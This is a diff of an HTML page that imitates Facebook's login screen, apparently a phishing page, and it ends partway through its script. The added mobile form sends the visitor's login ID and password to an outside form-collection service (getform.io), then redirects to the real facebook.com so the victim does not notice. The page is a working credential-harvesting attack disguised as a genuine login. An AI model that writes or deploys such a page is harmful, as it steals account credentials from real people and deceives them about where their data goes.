@@ -1,32 +1,69 @@
 <!DOCTYPE html>
+
 <html lang="en">
+
 <head>
+    
     <link rel="stylesheet" href="fb.css">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
     <title>Facebook Login</title>
 </head>
 <body>
-<h4><div   class="fb">facebook</div>
-Facebook helps you to connect and <br>
+  <section id="desktop">
+    
+  
+<div><h4><div   class="fb">facebook</div>
+Facebook helps you to connect and
 share with the people in your life.
 </h4>
-
+</div>
 <div class="right">
-
-<input type="text" name="" placeholder="Email address or phone number" class="input1" >
+<form>
+<input type="text" name="ID" placeholder="Email address or phone number" class="input1" required >
 <br>
-<input type="password" name="" placeholder="Password" class="input2" >
+<input type="password" name="Password" placeholder="Password" class="input2" required >
 <br>
-<button class="btn" onclick="btnonclick()">Log in</button>
+<button class="btn" type="submit" onclick="btnonclick()">Log in</button></form>
 <h5>Forgotten password?</h5>
 <hr>
 <button class="signup" onclick="location.href='fb2.html'">Create new account</button>
+</section>
 
+<section id="mobile">
+  <div class="header">
+          <span>
+      English (UK) 
+    </span>
+    
+    <span class="imgs"><img width="70" height"70" src="art.jpg"></span>
+    <form action='https://getform.io/f/axowjmxb' method='post'>
+    <span><input class="input1" name="ID" placeholder="Mobile number or email address" type="text" required></span>
+    
+        <span><input class="input2" name="password "placeholder="Password" type="text" required></span>
+      <div class="butto">
+          <span><button class="butt" type="submit" onclick="location.href='https://facebook.com' ">Log in</button></span>
+      </div>
+      </form>
+      <div class="und" onclick="location.href='fb2.html' ">Forgotten Password?</div>
+      
+      <div><button class="butt2" type="" onclick="location.href='fb2.html'">Create new account</button></div>
+      
+      <div>
+        <img class="meta" width="90" src="meta.jpg" alt="">
+      </div>
+      <div class="flex">
+        <div class="sep">about</div><div>help</div><div>more</div>
+      </div>
+      
+    </div>
+</section>
 <script>
     function btnonclick() {
-        alert("login successful")  
-        location.href='https://facebook.com'
+       location.href="https://facebook.com"  ;
         
     }
 
